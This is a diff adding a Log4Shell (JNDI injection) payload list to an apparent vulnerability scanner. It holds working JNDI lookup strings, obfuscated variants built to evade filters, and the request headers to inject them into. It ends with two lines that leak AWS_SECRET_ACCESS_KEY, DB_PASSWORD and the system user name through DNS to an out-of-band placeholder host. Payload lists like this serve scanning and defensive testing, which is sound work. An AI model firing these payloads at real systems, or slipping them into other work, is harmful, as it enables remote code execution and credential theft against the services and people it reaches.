@@ -1,0 +1,31 @@
+# Log4Shell / JNDI Injection Payloads — cyberm4fia-scanner
+# Categories: Core Payloads, Obfuscation, Common Injection Points
+
+# ─── Core Payloads ───
+${jndi:ldap://OAST/a}
+${jndi:ldaps://OAST/a}
+${jndi:rmi://OAST/a}
+${jndi:dns://OAST/a}
+${jndi:http://OAST/a}
+
+# ─── Obfuscation Bypasses ───
+${${::-j}${::-n}${::-d}${::-i}:ldap://OAST/a}
+${${lower:j}ndi:ldap://OAST/a}
+${${upper:j}ndi:ldap://OAST/a}
+${${lower:jn}${lower:di}:ldap://OAST/a}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//OAST/a}
+${${date:'j'}ndi:ldap://OAST/a}
+${jndi:ldap://127.0.0.1#.OAST/a}
+${${lower:l}${lower:d}ap://OAST/a}
+
+# ─── Common Injection Points ───
+User-Agent: ${jndi:ldap://OAST/a}
+X-Api-Version: ${jndi:ldap://OAST/a}
+Referer: ${jndi:ldap://OAST/a}
+X-Forwarded-For: ${jndi:ldap://OAST/a}
+Cookie: session=${jndi:ldap://OAST/a}
+Authorization: Bearer ${jndi:ldap://OAST/a}
+
+# ─── Env Var Exfil via DNS ───
+${jndi:ldap://${sys:user.name}.${env:AWS_SECRET_ACCESS_KEY}.OAST/a}
+${jndi:dns://${env:DB_PASSWORD}.OAST}
